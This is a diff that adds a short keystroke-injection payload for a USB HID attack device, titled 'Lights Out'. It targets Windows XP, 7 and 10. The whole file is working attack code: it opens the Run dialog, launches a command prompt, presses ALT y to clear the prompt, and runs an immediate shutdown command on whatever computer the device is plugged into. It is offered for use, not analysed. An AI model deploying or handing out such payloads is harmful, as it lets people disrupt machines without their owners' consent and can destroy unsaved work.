@@ -1,0 +1,28 @@
+Lights Out Payload:
+
+#title:         Lights Out
+#Description:  	Turns off Device once plugged in.
+#Author: 	White_Wid0w
+#Prop:  	IAmJakoby
+#Version:	2.0
+#Category: 	
+#Target:	Windows XP, 7, 10
+#Attackmode:	HID
+
+Description: Shuts down computer.
+
+
+code:
+
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 500
+ALT y
+DELAY 500
+STRING shutdown -s -t 0
+ENTER
+DELAY 500
